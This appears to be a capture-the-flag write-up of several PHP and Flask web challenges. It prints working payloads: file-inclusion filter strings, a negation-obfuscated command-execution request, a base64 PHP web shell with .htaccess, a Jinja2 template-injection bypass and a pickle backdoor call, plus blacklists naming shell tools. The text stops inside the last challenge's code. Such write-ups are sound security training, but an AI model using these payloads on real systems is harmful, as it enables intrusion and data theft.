<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="markdown_views prism-atom-one-dark" id="content_views">
<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
</svg>
<h1><a id="WEB_0"></a>WEB</h1>
<h2><a id="phpdest_2"></a>phpdest</h2>
<pre><code class="prism language-PHP">&lt;?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
    require_once($_GET['file']);
} 
</code></pre>
<p><a href="https://www.anquanke.com/post/id/213235">require_once 绕过不能重复包含文件的限制</a></p>
<pre><code>/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</code></pre>
<p><img alt="image-20220521233942302" src="https://img-blog.csdnimg.cn/img_convert/5790c69fe5d037789279aaf36bfe856a.png"/></p>
<h2><a id="EasyPHP_21"></a>EasyPHP</h2>
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"fl4g.php"</span><span class="token punctuation">;</span>
<span class="token variable">$dest0g3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$timme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$timmme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"24"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timme</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"31"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timmme</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">set_error_handler</span><span class="token punctuation">(</span>
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fl4g</span> <span class="token operator">.=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> 
</code></pre>
<p>搞了个自定义错误处理函数，让他报错就行，下面有个字符串拼接，传值数组即可</p>
<p><img alt="image-20220522000511901" src="https://img-blog.csdnimg.cn/img_convert/f1f23c66ac750773d12460a2159abb9f.png"/></p>
<h2><a id="SimpleRCE_49"></a>SimpleRCE</h2>
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'preg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'}'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ascii'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'replace'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pastre'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sed'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'scan'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'diff'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ini_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcntl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tac'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'current'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cut'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bash'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'wget'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'vi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'grep'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> 
</code></pre>
<p>phpinfo得到版本为7.2，可用($a)();这样的方法来执行动态函数，取反+通配符绕过</p>
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

data <span class="token operator">=</span> <span class="token string">"aaa=(~%8C%86%8C%8B%9A%92)('/?in/?at /fla?');"</span>

headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://5a8a9110-f92c-4974-a512-868fd16a163a.node4.buuoj.cn:81/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p><img alt="image-20220527145606699" src="https://img-blog.csdnimg.cn/img_convert/d01433025219cfb8586c07e9cff83e05.png"/></p>
<h2><a id="funny_upload_75"></a>funny_upload</h2>
<p>后缀名不能是php，前后端都有校验，文件内容过滤了&lt;?标签</p>
<p>.htaccess配合伪协议绕过内容过滤，并使得jpg解析</p>
<pre><code>Content-Disposition: form-data; name="file"; filename="hack.jpg"
Content-Type: image/jpeg

PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz
</code></pre>
<pre><code>Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: image/jpeg

SetHandler application/x-httpd-php
php_value auto_append_file "php://filter/convert.base64-decode/resource=hack.
</code></pre>
<p>phpinfo可见disable_functions</p>
<pre><code>system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
</code></pre>
<p>读文件的没过滤，直接盲打/flag 懒得bypass了</p>
<p><img alt="image-20220522234046293" src="https://img-blog.csdnimg.cn/img_convert/e5bb48346d3c44d6c4d5039087f6dd76.png"/></p>
<h2><a id="EasySSTI_106"></a>EasySSTI</h2>
<pre><code>. ' " [ _
pop getitem dict builtins request globals system import subclasses class init eval args mro os (空格)
</code></pre>
<p><img alt="image-20220522015229005" src="https://img-blog.csdnimg.cn/img_convert/65f3467437b60e0320aea651276eb1f2.png"/></p>
<p>过滤了好多关键字，常用的request也没了，只能set变量得到关键字绕过，看着和ctfshow web371 差不多 搜到这篇文章的payload直接能打空格用%0a代替就行 <a href="https://xz.aliyun.com/t/9584#toc-32">[2021 MAR &amp; DASCTF]baby_flask</a></p>
<p>burp发两次包就行 第一次设置变量 第二次执行</p>
<pre><code>{%%0aset%0azero%0a=%0a(self|int)%0a%}{%%0aset%0aone%0a=%0a(zero**zero)|int%0a%}{%%0aset%0atwo%0a=%0a(zero-one-one)|abs%0a%}{%%0aset%0afour%0a=%0a(two*two)|int%0a%}{%%0aset%0afive%0a=%0a(two*two*two)-one-one-one%0a%}{%%0aset%0athree%0a=%0afive-one-one%0a%}{%%0aset%0anine%0a=%0a(two*two*two*two-five-one-one)%0a%}{%%0aset%0aseven%0a=%0a(zero-one-one-five)|abs%0a%}{%%0aset%0aspace%0a=%0aself|string|min%0a%}{%%0aset%0apoint%0a=%0aself|float|string|min%0a%}{%%0aset%0ac%0a=%0adict(c=aa)|reverse|first%0a%}{%%0aset%0abfh%0a=%0aself|string|urlencode|first%0a%}{%%0aset%0abfhc%0a=%0abfh~c%0a%}{%%0aset%0aslas%0a=%0abfhc%((four~seven)|int)%0a%}{%%0aset%0ayin%0a=%0abfhc%((three~nine)|int)%0a%}{%%0aset%0axhx%0a=%0abfhc%((nine~five)|int)%0a%}{%%0aset%0aright%0a=%0abfhc%((four~one)|int)%0a%}{%%0aset%0aleft%0a=%0abfhc%((four~zero)|int)%0a%}{%%0aset%0abut%0a=%0adict(buil=aa,tins=dd)|join%0a%}{%%0aset%0aimp%0a=%0adict(imp=aa,ort=dd)|join%0a%}{%%0aset%0apon%0a=%0adict(po=aa,pen=dd)|join%0a%}{%%0aset%0aso%0a=%0adict(o=aa,s=dd)|join%0a%}{%%0aset%0aca%0a=%0adict(ca=aa,t=dd)|join%0a%}{%%0aset%0aflg%0a=%0adict(fl=aa,ag=dd)|join%0a%}{%%0aset%0aev%0a=%0adict(ev=aa,al=dd)|join%0a%}{%%0aset%0ared%0a=%0adict(re=aa,ad=dd)|join%0a%}{%%0aset%0abul%0a=%0axhx~xhx~but~xhx~xhx%0a%}{%%0aset%0aini%0a=%0adict(ini=aa,t=bb)|join%0a%}{%%0aset%0aglo%0a=%0adict(glo=aa,bals=bb)|join%0a%}{%%0aset%0aitm%0a=%0adict(ite=aa,ms=bb)|join%0a%}{%%0aset%0apld%0a=%0axhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%0a%}{%%0afor%0af,v%0ain%0a(self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))()%0a%}{%%0aif%0af%0a==%0abul%0a%}{%%0afor%0aa,b%0ain%0a(v|attr(itm))()%0a%}{%%0aif%0aa%0a==%0aev%0a%}{<!-- -->{b(pld)}}{%%0aendif%0a%}{%%0aendfor%0a%}{%%0aendif%0a%}{%%0aendfor%0a%}
</code></pre>
<p><img alt="image-20220527143848926" src="https://img-blog.csdnimg.cn/img_convert/89923caef016e8d422bfd4fc4134f873.png"/></p>
<h2><a id="middle_125"></a>middle</h2>
<p>Python Pickle反序列化</p>
<pre><code class="prism language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> config
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>make_response
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> io
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64


app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token string">"__"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>
    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_dir<span class="token punctuation">,</span> __file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_dir<span class="token punctuation">,</span> <span class="token string">"config/__init__.py"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"text/plain;charset=UTF-8"</span>
    <span class="token keyword">return</span> resp

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>
    User <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>User<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>

<span class="token comment">#__init__.py</span>
<span class="token keyword">import</span> os
<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 这里我也改了一下</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
        s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"!!!!!!!!!!"</span><span class="token punctuation">)</span>
        s<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"??????"</span><span class="token punctuation">)</span>
</code></pre>
<p>限定了只能反序列化<code>config</code>类，而且调用的方法或属性中不能含有<code>__</code></p>
<p>不过题目给了个后门函数，反序列化直接调用即可，命令执行还有回显太贴心了</p>
<pre><code>config_backdoor = GLOBAL('config', 'backdoor')
config_backdoor(["__import__('os').popen('cat /flag.txt').read()"])
return
</code></pre>
<p><img alt="image-20220523002556126" src="https://img-blog.csdnimg.cn/img_convert/54a0e3a5fa908c8a991722609f8f0617.png"/></p>
<p><img alt="image-20220523002608298" src="https://img-blog.csdnimg.cn/img_convert/539eb7d5e6434db1a77d9c35a9642abf.png"/></p>
<h2><a id="PharPOP_195"></a>PharPOP</h2>
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">-&gt;</span><span class="token property">act</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$p</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">xxx</span><span class="token operator">-&gt;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"It is file"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can look at the others"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">banana</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// flag in /</span>
